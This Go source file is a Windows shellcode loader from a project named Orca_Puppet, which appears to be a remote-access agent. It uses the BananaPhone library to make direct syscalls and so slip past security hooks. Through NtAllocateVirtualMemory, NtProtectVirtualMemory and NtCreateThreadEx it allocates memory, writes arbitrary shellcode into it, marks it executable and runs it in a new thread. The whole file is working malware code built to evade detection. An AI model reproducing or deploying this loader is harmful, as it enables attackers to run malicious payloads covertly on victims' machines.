//go:build windows
// +build windows

package loader

import (
	"Orca_Puppet/define/colorcode"
	"fmt"
	bananaphone "github.com/C-Sto/BananaPhone/pkg/BananaPhone"
	"syscall"
	"unsafe"
)

func RunBananaPhone(shellcode []byte, pid int) string {
	stdErr := ""
	bp, e := bananaphone.NewBananaPhone(bananaphone.AutoBananaPhoneMode)
	if e != nil {
		message := fmt.Sprintf("%s", e)
		stdErr = colorcode.OutputMessage(colorcode.SIGN_FAIL, message)
		return stdErr
	}
	//resolve the functions and extract the syscalls
	alloc, e := bp.GetSysID("NtAllocateVirtualMemory")
	if e != nil {

	}
	protect, e := bp.GetSysID("NtProtectVirtualMemory")
	if e != nil {
		message := fmt.Sprintf("%s", e)
		stdErr = colorcode.OutputMessage(colorcode.SIGN_FAIL, message)
		return stdErr
	}
	createthread, e := bp.GetSysID("NtCreateThreadEx")
	if e != nil {
		message := fmt.Sprintf("%s", e)
		stdErr = colorcode.OutputMessage(colorcode.SIGN_FAIL, message)
		return stdErr
	}

	createThread(shellcode, uintptr(0xffffffffffffffff), alloc, protect, createthread)
	return ""
}

func createThread(shellcode []byte, handle uintptr, NtAllocateVirtualMemorySysid, NtProtectVirtualMemorySysid, NtCreateThreadExSysid uint16) {

	const (
		thisThread = uintptr(0xffffffffffffffff) //special macro that says 'use this thread/process' when provided as a handle.
		memCommit  = uintptr(0x00001000)
		memreserve = uintptr(0x00002000)
	)

	var baseA uintptr
	regionsize := uintptr(len(shellcode))
	r1, r := bananaphone.Syscall(
		NtAllocateVirtualMemorySysid, //ntallocatevirtualmemory
		handle,
		uintptr(unsafe.Pointer(&baseA)),
		0,
		uintptr(unsafe.Pointer(&regionsize)),
		uintptr(memCommit|memreserve),
		syscall.PAGE_READWRITE,
	)
	if r != nil {
		fmt.Printf("%s %x\n", r, r1)
		return
	}
	//write memory
	bananaphone.WriteMemory(shellcode, baseA)

	var oldprotect uintptr
	r1, r = bananaphone.Syscall(
		NtProtectVirtualMemorySysid, //NtProtectVirtualMemory
		handle,
		uintptr(unsafe.Pointer(&baseA)),
		uintptr(unsafe.Pointer(&regionsize)),
		syscall.PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldprotect)),
	)
	if r != nil {
		fmt.Printf("1 %s %x\n", r, r1)
		return
	}
	var hhosthread uintptr
	r1, r = bananaphone.Syscall(
		NtCreateThreadExSysid,                //NtCreateThreadEx
		uintptr(unsafe.Pointer(&hhosthread)), //hthread
		0x1FFFFF,                             //desiredaccess
		0,                                    //objattributes
		handle,                               //processhandle
		baseA,                                //lpstartaddress
		0,                                    //lpparam
		uintptr(0),                           //createsuspended
		0,                                    //zerobits
		0,                                    //sizeofstackcommit
		0,                                    //sizeofstackreserve
		0,                                    //lpbytesbuffer
	)
	syscall.WaitForSingleObject(syscall.Handle(hhosthread), 0xffffffff)
	if r != nil {
		fmt.Printf("1 %s %x\n", r, r1)
		return
	}
}
